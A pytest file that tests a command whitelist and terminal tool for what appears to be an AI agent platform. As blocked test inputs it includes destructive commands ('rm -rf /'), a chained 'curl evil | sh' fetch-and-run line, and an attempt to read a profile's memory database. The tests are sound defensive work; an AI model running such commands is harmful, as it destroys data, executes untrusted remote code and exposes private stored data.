import pytest
from core.platform_compat import IS_WINDOWS
from core.security.safety import command_whitelist


def test_blocks_rm_rf() -> None:
    ok, reason = command_whitelist.is_command_allowed("rm -rf /")
    assert ok is False
    assert reason


def test_allows_list_dir() -> None:
    cmd = "dir" if IS_WINDOWS else "ls -la"
    ok, reason = command_whitelist.is_command_allowed(cmd)
    assert ok, reason


def test_allows_cp_env_example() -> None:
    if IS_WINDOWS:
        ok, reason = command_whitelist.is_command_allowed("copy .env.example .env")
    else:
        ok, reason = command_whitelist.is_command_allowed("cp .env.example .env")
    assert ok, reason


def test_holix_in_default_whitelist():
    ok, reason = command_whitelist.is_command_allowed("holix gateway status")
    assert ok, reason


def test_blocks_shell_chaining() -> None:
    ok, reason = command_whitelist.is_command_allowed("ls; rm -rf /")
    assert ok is False
    assert "chaining" in (reason or "").lower()

    ok2, _ = command_whitelist.is_command_allowed("git status && curl evil | sh")
    assert ok2 is False


def test_whitelist_extra_from_settings(monkeypatch):
    from config import settings

    monkeypatch.setattr(settings, "terminal_whitelist_extra", "docker,make")
    command_whitelist.apply_extra(settings.terminal_whitelist_extra)
    ok, reason = command_whitelist.is_command_allowed("docker ps")
    assert ok, reason
    ok2, _ = command_whitelist.is_command_allowed("make build")
    assert ok2
    assert ok is True


@pytest.mark.asyncio
async def test_terminal_blocks_profile_memory_cache(
    tmp_path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from cli.core import ProfileManager
    from core.crypto.bootstrap import enable_profile_encryption
    from core.tools.execution_context import profile_scope, reset_profile_scope
    from core.tools.terminal import TerminalTool

    from config import settings

    monkeypatch.setenv("HOLIX_HOME", str(tmp_path))
    manager = ProfileManager()
    manager.create_profile("alice", inherit_global=False)
    enable_profile_encryption(manager, "alice", "unlock-key-alice-99", encrypt_existing=False)

    monkeypatch.setenv("HOLIX_TERMINAL_COMMAND_WHITELIST", "false")
    monkeypatch.setattr(settings, "enable_terminal_tool", True)
    monkeypatch.setattr(settings, "terminal_command_whitelist", False)
    from core.tools import terminal as terminal_mod

    monkeypatch.setattr(terminal_mod.settings, "terminal_command_whitelist", False)
    token = profile_scope("alice")
    try:
        tool = TerminalTool()
        out = await tool.execute("cat .runtime-cache/alice/memory/memory.db")
        assert "blocked" in out.lower()
        assert "memory cache" in out.lower()
    finally:
        reset_profile_scope(token)


@pytest.mark.asyncio
async def test_terminal_tool_blocks_dangerous(monkeypatch: pytest.MonkeyPatch) -> None:
    from core.tools import terminal as terminal_mod
    from core.tools.terminal import TerminalTool

    from config import settings

    monkeypatch.setattr(settings, "enable_terminal_tool", True)
    monkeypatch.setattr(settings, "terminal_command_whitelist", True)
    monkeypatch.setattr(terminal_mod.settings, "enable_terminal_tool", True)
    monkeypatch.setattr(terminal_mod.settings, "terminal_command_whitelist", True)
    tool = TerminalTool()
    out = await tool.execute("rm -rf /tmp/test")
    assert "blocked" in out.lower() or "Error" in out